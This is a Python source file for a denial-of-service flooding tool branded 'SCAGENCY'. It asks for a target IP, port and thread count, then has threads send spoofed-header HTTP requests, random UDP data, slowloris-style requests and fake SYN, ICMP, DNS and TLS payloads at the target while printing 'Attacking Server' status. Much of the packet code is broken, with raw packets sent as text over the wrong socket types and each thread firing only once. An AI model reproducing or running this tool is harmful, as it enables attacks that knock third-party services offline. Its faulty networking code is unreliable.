try:
    import socket, random, os, threading, sys, struct, subprocess
except ModuleNotFoundError as e:
    print("Module Not Installed.. ", (e))
if os.name == 'posix':
    os.system('clear')
elif os.name == 'nt':
    os.system('cls')
def menu():
    subprocess.run(["python", "main.py"])

logo = """

 ██████╗ █████╗    █████╗  ██████╗ ███████╗███╗  ██╗ █████╗ ██╗   ██╗
██╔════╝██╔══██╗  ██╔══██╗██╔════╝ ██╔════╝████╗ ██║██╔══██╗╚██╗ ██╔╝
╚█████╗ ██║  ╚═╝  ███████║██║  ██╗ █████╗  ██╔██╗██║██║  ╚═╝ ╚████╔╝
 ╚═══██╗██║  ██╗  ██╔══██║██║  ╚██╗██╔══╝  ██║╚████║██║  ██╗  ╚██╔╝
██████╔╝╚█████╔╝  ██║  ██║╚██████╔╝███████╗██║ ╚███║╚█████╔╝   ██║
╚═════╝  ╚════╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚══╝ ╚════╝    ╚═╝

                                                                                                                       
                                                       .^~^                                                             
                                                      :~~!~~:                                                           
                                                   .:~^..~..^^:.                 .::.                                   
                             ^~~~^.             .:^^:.  .~.  .:^^:..            :!!!!~.                                 
                            .!!!!!^.     ....:^^^:.     .~.     .::^^^::::..:..:~!!!!~.                                 
                             :^~^~!~~^:^:::::..         .!.          ...::::::~~~~:..                                   
                                 ^~:^^.                :~!~^.               :^: ^~                                      
                                 :~. .^^:           .:^::~::^^:.         .:~:.  ^~                                      
                                 :~.   .:~^::.::::^^^.  .~.  .:^^^:::::^^~:     :~.                                     
                                 :~      .!!~^::...     .~.      ....:~~!.       ~:                                     
               .                .~:       ~:.^^.        .!:        .^^..~.       :~.               :^:                  
             :^~^               ~^       .~.  .^^:   ..^~!~^:.. ..^^.   ^^        :~.              ^~:^.                
           .^^.~:             .^^        ~^     .^~~^^:..~:.::^~!~.     .~:        :~:             .~::~~:              
          ^!!^~!.            :~:       .^^       ^~:~^.  ~:  :^^^~.      .~^        .^~:           .~~~!~~              
         .~^!~^~.   ...   .:^^.       :~:       :~.  :^^:~::^^.  ^^.       :^:.       .^^:. .:^:.   :~^!~~~.            
        :!!~!~~^   ^~!!~^^~^:.......:~~:......:^!:.....^!!!~:.::::^!^::::::::~!^::::::::^!~~!!!!!:  ^!!!!~^~            
        ~:^!!~~~  .~!!!!~!!^::::::::^~~::::::::^!^:::::~~!~~~:::::~~:.......~~:........:~~^:~!!!~.  ^^.~!^ ~:           
       .~ :!~ :~   .:^^. .:^^.        ^~.       :~. .:^:.~:.:^:  ^~        ^^        .^^:    ...    .~..~~ ^:           
       .~:^~..~:            :^^.       .~:       ^~^~:   ~:  .:~^!:      .~:        ^~:              :~^^!^~~:          
      :~~~!~~!^               :~:       .~.     .~~~^^^::~:.:^^^^~^.     ^^        ^^.               .~~~!~~^~          
      ^^:~!!:^^                .~:       :~   .^^.    .:^!~^:.    :^^:  .~.       ^^                 .~.:!!:.~.         
      :~ ^!: ~:                 .~.      .~:.^^.         ~^         .^^:^~       :~.                  ^^.^~.^^          
      .~::!:^~.                  :~       ~!!^....       ~:      ..:::^!!~.      ~^                   ^~^~~^~:          
      .~~~!^^~~.                 .~.    :^^:.::::::^^:.  ~^  .:^^^::.....:^^.   .~.                  ^~^^~!~^!.         
      :~:~!~~.^^                 .~:  :^^.          ..:^^~^.^^:.           :^^:  ~.                 .~. ~!~..~.         
      :~ .~!: :~                  ~::^:.                :~~^.                :^^:!:                 :~. ^!. :~          
       ~: .!: :!^.            .:::!!~^:^:^^:::..         ^^        ..:::^^^^^^^~!!~::.             ^~!^.~^ :~.          
       .^^:~~^!^:~.          :!!!!!^.........::^^^:.     ^^     .:^^:...        .!!!!!^           :~ ^~~!!~~:           
        ^~~!!^~: ^~          :!!!!~.             .:^^:   ^^   :^^:.              ^~!!~:          :~. :~~~^:~~           
        ^~ .^!!:  ~~:         .::.                  .^^: ^^ :^^.                  ...          .^!~  ^!~. :~.           
         ^^  :~~  ~!^^.                               .:^~~^^.                                ^^:~!..!^  :~.            
          ^^:.:!^^!~ .^^.                               :!!~.                               .^:  ~~~!!^^^:.             
           :~~~!!!^~.  :^:.                            :!!!!~.                           .:^~.  :~~!~^^^~:              
           :~^..:^~!~.  ^!~^:                          :~!!!^                          .^^^!~  :!!^.  .^:               
             ^^.  .:~~:.^!^.:^^.                         ...                         :^^. :!~:~~^.  .:^.                
              .^^:. .^!!!~~:  :^^^::..                    :.                  ..::^~~~.  :~~!!!~:::^^.                  
                .::^!~^^^~~!~:..~!^:::^^:            :^^:^!~::^^.           :^^:..^~!:.^~~^::.:^!~.                     
                   .^^^:   .:~~^~~^^.. .:^.          .^^. ~: ^~.          .^^...:~~~!!~^.   .:^:.                       
                      .:^::.. :~!~^~~~~^^~~.        .. .^^~~^: ...       .^!^~~~~^:^~~^:.:^^^.                          
                         .::^~!^..   ..:^~!!~^^^^^^~~!^:^~!!~:^!~~^^^~^~~~!!~:.     .:~~:..                             
                             .::::::::^~~^:....~~..:^~:.:~!~~:.^:^. .~^.  ..^~~^^^::::..                                
                                   .^~::.....:^^.      ^^.~:.^:      .^^::....:^!:                                      
                                    :^::::::::.      :~~::~~::~~.      ..::::::::.                                      
                                                     .....^:.....                                                                                                                                                                        
"""
logo_width = len(logo.splitlines()[0])
terminal_width = os.get_terminal_size().columns

padding = int((terminal_width - logo_width) / 2)

print("\033[31;1m" + "".join([" " * padding, logo, ""]))
print("""\033[36;1m

Features Ready: DNS Flood, HTTP.

Author : \033[32;1mSCAGENCY
\033[36;1mTeam : \033[32;1m777Company

\033[36;1mGO!!!!!
""")
print('\n')
try:
    ip = str(input("\033[32;1mIP : "))
    port = int(input("Port : "))
    thread = int(input("Thread : "))
except EOFError:
    exit()
except ValueError:
    print("Please fill in the target information correctly.")
    exit()
print('\n')

def c2():
    ang = ['1','2','3','4','5','6','7','8','9','0']
    n1 = random.choice(ang)
    n2 = random.choice(ang)
    n3 = random.choice(ang)
    n4 = random.choice(ang)
    n5 = random.choice(ang)
    n6 = random.choice(ang)
    n7 = random.choice(ang)
    fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    slowloris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    syn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    icmp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dnsf = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    icmp2 = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
    tls2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        http.connect((ip,port))
        http.sendto(("GET / HTTP/1.1\r\n").encode('utf-8'), (ip,port))
        http.sendto(("Host: "+ip+"\r\n").encode('utf-8'), (ip,port))
        http.sendto((f"X-Real-IP: {fip}\r\n\r\n").encode('utf-8'), (ip,port))
        http.sendto(("Connection: Keep-Alive\r\n").encode('utf-8'), (ip,port))
        http.sendto(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode('utf-8'), (ip,port))
        http.close()
        tcp.connect((ip,port))
        tcp.sendto(("\x00\x00\x00\x80").encode('utf-8'), (ip,port))
        tcp.close()
        bytes = random._urandom(4096)
        udp.connect((ip,port))
        udp.sendto(bytes, (ip,port))
        udp.close()
        slowloris.connect((ip,port))
        slowloris.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\nX-Real-IP: {fip}\r\n\r\n".encode('utf-8'))
        slowloris.send(f"X-a: {i}\r\n".encode('utf-8'))
        slowloris.close()
        syn_template = "0x0000   01010000  00000000  00000000  00000000"
        syn_template += "0x0004   00000000  00000000  00000000  00000000"
        syn_template += "0x0008   00000000  00000000  00000000  00000000"
        syn_template += "0x0012   00000000  00000000  00000000  00000000"
        syn_template += "0x0016   00000000  00000000  00000000  00000000"
        syn_template += "0x0020   00000000  00000000  00000000  00000000"
        syn_template += "0x0024   00000000  00000000  00000000  00000000"
        syn_template += "0x0028   00000000  00000000  00000000  00000000"
        syn_template += "0x0032   00000000  00000000  00000000  00000000"
        syn_template += "0x0036   00000000  00000000  00000000  00000000"
        syn_template += "0x0040   00000000  00000000  00000000  00000000"
        syn.connect((ip,port))
        syn.sendto(syn_template.encode('utf-8'), (ip,port))
        syn.close()
        icmp.connect((ip,port))
        icmp.sendto(("0   8   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0").encode('utf-8'), (ip,port))
        icmp.close()
        dns = "00 04 00 01 00 00 00 00  00 00 00 00 03 77 77 77"
        dns += "04 65 78 61 6D 70 6C 65  03 63 6F 6D 00 00 01 00"
        dns += "01"
        request = "AA AA 01 00 00 01 00 00 00 00 00 00 "
        request += "01 01 00 01 00 00 29 10 00 00 00 00 00 00 00 00 "
        request += "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
        dnsf.connect((ip,port))
        dnsf.send(dns.encode('utf-8'))
        dnsf.send(request.encode('utf-8'))
        dnsf.close()
        tls.connect((ip,port))
        tls_temp = b'Client GET'
        tls_temp += b'\x03\x03'
        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        tls_temp += b'\x01\x00\x00\x00\x00\x00\x00\x00'
        tls.sendall(tls_temp)
        tls.close()
        icmp_code = 12
        icmp_packet = struct.pack("BBHHH", icmp_code, 0, 0, os.getpid(), 1)
        icmp2.connect((ip,port))
        icmp2.sendto(icmp_packet, (ip, port))
        icmp2.close()
        tls2.connect((ip,port))
        heads = b'\x16\x03\x01\x00\xea\x01\x00\x00\xe6\x03\x03' + b'A' * 120
        tls2.send(heads)
        tls2.close()
        tcp_syn.connect((ip,port))
        tcp_syn.sendto(b'\x16\x03\x01\x00', (ip,port))
        tcp_syn.close()
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Fine            ", f"Proxy-Agent : {fip}", end='\r')
    except TimeoutError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Down            ", f"Proxy-Agent : {fip}", end='\r')
    except OSError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Buffer          ", f"Proxy-Agent : {fip}", end='\r')
    except ConnectionAbortedError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Aborted         ", f"Proxy-Agent : {fip}", end='\r')
    except ConnectionError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Lost Connection ", f"Proxy-Agent : {fip}", end='\r')
    except ConnectionRefusedError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Refused         ", f"Proxy-Agent : {fip}", end='\r')
    except ConnectionResetError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Reset           ", f"Proxy-Agent : {fip}", end='\r')
    except Exception as e:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Error           ", f"Proxy-Agent : {fip}", end='\r')
    except RuntimeError:
        print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Runtime Error   ", f"Proxy-Agent : {fip}", end='\r')
        exit()
    except KeyboardInterrupt:
        exit()    
for i in range(thread):
    t = threading.Thread(target=c2)
    t.start()
